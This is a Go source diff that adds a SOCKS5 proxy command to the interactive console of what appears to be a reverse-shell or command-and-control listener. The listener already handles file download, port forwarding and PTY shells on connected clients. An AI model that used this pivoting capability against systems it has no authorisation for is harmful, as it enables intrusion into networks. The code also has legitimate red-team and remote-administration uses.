@@ -180,6 +180,21 @@ func interactiveShell(l server.ListenerInterface) {
 			handleForward(l, clientAddr, parts[2], parts[3])
 		case "forwards":
 			listForwards(l)
+		case "socks":
+			if len(parts) < 2 {
+				fmt.Println("Usage: socks <client_id> <local_port>")
+				fmt.Println("Example: socks 1 1080")
+				continue
+			}
+			if len(parts) != 3 {
+				fmt.Println("Usage: socks <client_id> <local_port>")
+				continue
+			}
+			clientAddr := getClientByID(l, parts[1])
+			if clientAddr == "" {
+				continue
+			}
+			handleSocks(l, clientAddr, parts[2])
 		case "exit":
 			return
 		default:
@@ -196,6 +211,7 @@ func printHelp() {
 	fmt.Println("  download <id> <remote> <local> - Download remote file from client")
 	fmt.Println("  forward <id> <local_port> <remote_addr> - Forward local port to remote address through client")
 	fmt.Println("  forwards                    - List active port forwards")
+	fmt.Println("  socks <id> <local_port>     - Start SOCKS5 proxy on local port through client")
 	fmt.Println("  exit                        - Exit the listener")
 	fmt.Println()
 	fmt.Println("In PTY shell mode:")
@@ -595,5 +611,30 @@ func listForwards(l server.ListenerInterface) {
 		}
 	} else {
 		fmt.Println("Error: could not access forward manager")
+	}
+}
+
+func handleSocks(l server.ListenerInterface, clientAddr, localPort string) {
+	// Generate unique SOCKS ID
+	socksID := fmt.Sprintf("socks-%d", time.Now().UnixNano())
+	
+	// Get access to the SOCKS manager (via type assertion)
+	if listener, ok := l.(*server.Listener); ok {
+		// Create send function for this client
+		sendFunc := func(msg string) {
+			_ = l.SendCommand(clientAddr, msg)
+		}
+		
+		err := listener.GetSocksManager().StartSocks(socksID, localPort, sendFunc)
+		if err != nil {
+			fmt.Printf("Failed to start SOCKS proxy: %v\n", err)
+			return
+		}
+		
+		fmt.Printf("✓ SOCKS5 proxy started on 127.0.0.1:%s (via %s)\n", localPort, clientAddr)
+		fmt.Printf("  SOCKS ID: %s\n", socksID)
+		fmt.Printf("  Configure your browser/app to use SOCKS5 proxy at 127.0.0.1:%s\n", localPort)
+	} else {
+		fmt.Println("Error: could not access SOCKS manager")
 	}
 }
